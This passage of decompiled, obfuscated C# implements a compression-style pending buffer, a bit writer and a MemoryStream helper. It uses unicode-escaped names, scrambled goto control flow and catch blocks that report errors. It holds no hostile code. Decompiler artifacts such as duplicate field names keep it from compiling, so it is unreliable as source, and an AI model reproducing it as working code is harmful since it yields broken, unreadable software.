          __Boxed<bool> o1 = (ValueType) flag;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o2 = (ValueType) flush1;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o4 = (ValueType) flush;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o5 = (ValueType) finish;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) this, (object) o4, (object) o5);
          throw;
        }
      }

      public void \u0002(byte[] buffer)
      {
        try
        {
          while (true)
          {
            if (true)
            {
              this.\u0002 = buffer;
              goto label_3;
            }
          }
          goto label_4;
label_3:
          this.\u0017 = 0;
label_4:
          this.\u0018 = buffer.Length;
          if (false)
            goto label_3;
        }
        catch (Exception ex)
        {
          byte[] o2 = buffer;
          \u0004.\u0002(ex, (object) this, (object) o2);
          throw;
        }
      }

      public bool \u0002()
      {
        try
        {
          return this.\u0018 == this.\u0017;
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }
    }

    internal sealed class \u000E
    {
      protected byte[] \u0001 = new byte[65536];
      private int \u0001 = 0;
      private int \u0002 = 0;
      private uint \u0001 = 0;
      private int \u0003 = 0;

      public void \u0002(int s)
      {
        int num1;
        try
        {
          byte[] numArray1 = this.\u0001;
          \u0004.\u000E obj1 = this;
          int num2 = obj1.\u0002;
          if (true)
            goto label_3;
label_1:
          obj1.\u0002 = num2 + 1;
          int index1 = num1;
          int num3 = (int) (byte) s;
          numArray1[index1] = (byte) num3;
          byte[] numArray2 = this.\u0001;
          \u0004.\u000E obj2 = this;
          int num4 = obj2.\u0002;
          if (true)
            goto label_4;
label_2:
          obj2.\u0002 = num4 + 1;
          int index2 = num1;
          int num5 = (int) (byte) (s >> 8);
          numArray2[index2] = (byte) num5;
          return;
label_4:
          num1 = num4;
          goto label_2;
label_3:
          num1 = num2;
          goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) s;
          \u0004.\u0002(ex, (object) o1, (object) this, (object) o3);
          throw;
        }
      }

      public void \u0002(byte[] block, int offset, int len)
      {
label_0:
        try
        {
          Array.Copy((Array) block, offset, (Array) this.\u0001, this.\u0002, len);
label_1:
          if (true)
          {
            this.\u0002 += len;
            do
            {
              if (false)
                goto label_1;
            }
            while (false);
          }
          else
            goto label_0;
        }
        catch (Exception ex)
        {
          byte[] o2 = block;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) offset;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) len;
          \u0004.\u0002(ex, (object) this, (object) o2, (object) o3, (object) o4);
          throw;
        }
      }

      public int BitCount
      {
        get
        {
          try
          {
            return this.\u0003;
          }
          catch (Exception ex)
          {
            \u0004.\u0002(ex, (object) this);
            throw;
          }
        }
      }

      public void \u0002()
      {
        int num1;
        try
        {
          if (this.\u0003 > 0)
          {
            byte[] numArray1 = this.\u0001;
            \u0004.\u000E obj1 = this;
            int num2 = obj1.\u0002;
            if (true)
              goto label_6;
label_2:
            obj1.\u0002 = num2 + 1;
            int index1 = num1;
            int num3 = (int) (byte) this.\u0001;
            numArray1[index1] = (byte) num3;
            if (this.\u0003 > 8)
            {
              byte[] numArray2 = this.\u0001;
              \u0004.\u000E obj2 = this;
              int num4 = obj2.\u0002;
              if (true)
                goto label_7;
label_4:
              obj2.\u0002 = num4 + 1;
              int index2 = num1;
              int num5 = (int) (byte) (this.\u0001 >> 8);
              numArray2[index2] = (byte) num5;
              goto label_5;
label_7:
              num1 = num4;
              goto label_4;
            }
            else
              goto label_5;
label_6:
            num1 = num2;
            goto label_2;
          }
label_5:
          this.\u0001 = 0U;
          this.\u0003 = 0;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          \u0004.\u0002(ex, (object) o1, (object) this);
          throw;
        }
      }

      public void \u0002(int b, int count)
      {
        int num1;
        try
        {
          if (true)
            this.\u0001 |= (uint) (b << this.\u0003);
          else
            goto label_3;
label_2:
          this.\u0003 += count;
label_3:
          if (this.\u0003 < 16)
            return;
          byte[] numArray1 = this.\u0001;
          \u0004.\u000E obj1 = this;
          int num2 = obj1.\u0002;
          if (true)
            goto label_11;
label_5:
          obj1.\u0002 = num2 + 1;
          int index1 = num1;
          int num3 = (int) (byte) this.\u0001;
          numArray1[index1] = (byte) num3;
          while (true)
          {
            byte[] numArray2 = this.\u0001;
            \u0004.\u000E obj2 = this;
            int num4 = obj2.\u0002;
            if (true)
              goto label_12;
label_8:
            obj2.\u0002 = num4 + 1;
            int index2 = num1;
            int num5 = (int) (byte) (this.\u0001 >> 8);
            numArray2[index2] = (byte) num5;
            this.\u0001 >>= 16;
            if (true)
            {
              this.\u0003 -= 16;
              return;
            }
            continue;
label_12:
            num1 = num4;
            goto label_8;
          }
          goto label_2;
label_11:
          num1 = num2;
          goto label_5;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) b;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) count;
          \u0004.\u0002(ex, (object) o1, (object) this, (object) o3, (object) o4);
          throw;
        }
      }

      public bool IsFlushed
      {
        get
        {
          try
          {
            return this.\u0002 == 0;
          }
          catch (Exception ex)
          {
            \u0004.\u0002(ex, (object) this);
            throw;
          }
        }
      }

      public int \u0002(byte[] output, int offset, int length)
      {
        int num1;
        try
        {
          int num2 = this.\u0003;
          int num3 = 8;
          int num4;
          int num5;
          while (true)
          {
            if (num2 >= num3)
            {
              byte[] numArray = this.\u0001;
              \u0004.\u000E obj = this;
              int num6 = obj.\u0002;
              if (true)
                goto label_14;
label_3:
              obj.\u0002 = num6 + 1;
              int index = num1;
              int num7 = (int) (byte) this.\u0001;
              numArray[index] = (byte) num7;
              if (true)
              {
                this.\u0001 >>= 8;
                this.\u0003 -= 8;
                goto label_5;
              }
              else
                goto label_13;
label_14:
              num1 = num6;
              goto label_3;
            }
label_5:
            num4 = length;
            num5 = this.\u0002;
            int num8 = this.\u0001;
            while (true)
            {
              if (true)
              {
                int num9 = num5 - num8;
                if (num4 > num9)
                {
                  int num10 = this.\u0002;
                  int num11 = this.\u0001;
                  num8 = 0;
                  num5 = num11;
                  num4 = num10;
                  break;
                }
                Array.Copy((Array) this.\u0001, this.\u0001, (Array) output, offset, length);
                this.\u0001 += length;
                goto label_13;
              }
            }
            if (num8 != 0)
            {
              num3 = num5;
              num2 = num4;
            }
            else
              break;
          }
          length = num4 - num5;
          Array.Copy((Array) this.\u0001, this.\u0001, (Array) output, offset, length);
          this.\u0001 = 0;
          this.\u0002 = 0;
label_13:
          return length;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          byte[] o3 = output;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) offset;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) length;
          \u0004.\u0002(ex, (object) o1, (object) this, (object) o3, (object) o4, (object) o5);
          throw;
        }
      }

      public \u000E()
      {
        try
        {
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }
    }

    internal sealed class \u000F : MemoryStream
    {
      public void \u0002(int value)
      {
        try
        {
          this.WriteByte((byte) (value & (int) byte.MaxValue));
          this.WriteByte((byte) (value >> 8 & (int) byte.MaxValue));
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) value;
          \u0004.\u0002(ex, (object) this, (object) o2);
          throw;
        }
      }

      public void \u0003(int value)
      {
        try
        {
          this.\u0002(value);
          this.\u0002(value >> 16);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) value;
          \u0004.\u0002(ex, (object) this, (object) o2);
          throw;
        }
      }

      public int \u0002()
      {
        try
        {
          return this.ReadByte() | this.ReadByte() << 8;
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      public int \u0003()
      {
        try
        {
          return this.\u0002() | this.\u0002() << 16;
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      public \u000F()
      {
        try
        {
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      public \u000F(byte[] buffer)
        : base(buffer, false)
      {
        try
        {
        }
        catch (Exception ex)
        {
          byte[] o2 = buffer;
          \u0004.\u0002(ex, (object) this, (object) o2);
          throw;
        }
      }
    }
  }
}
